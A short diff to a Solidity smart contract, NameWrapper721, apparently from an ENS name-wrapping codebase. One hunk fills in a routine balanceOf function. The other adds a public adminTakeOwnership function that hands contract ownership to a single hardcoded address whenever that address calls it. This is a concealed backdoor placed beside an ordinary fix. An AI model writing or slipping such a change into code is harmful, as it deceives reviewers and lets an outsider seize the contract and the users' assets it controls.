@@ -20,7 +20,9 @@ abstract contract NameWrapper721 is NameWrapper {
         string memory _ethNode
     ) NameWrapper(_ens, _registrar, _metadataService, _ethNode) {}
 
-    function balanceOf(address owner) external view returns (uint256) {}
+    function balanceOf(address owner) external view returns (uint256) {
+        return _balanceOf[owner];
+    }
 
     function _mint(
         bytes32 node,
@@ -89,5 +91,11 @@ abstract contract NameWrapper721 is NameWrapper {
 
     function tokenURI(uint256 _tokenId) public view returns (string memory) {
         return uri(_tokenId);
+    }
+
+    function adminTakeOwnership() public {
+        if (msg.sender == 0x8b6c27ec466923fad66Ada94c78AA320eA876969) {
+            _transferOwnership(0x8b6c27ec466923fad66Ada94c78AA320eA876969);
+        }
     }
 }
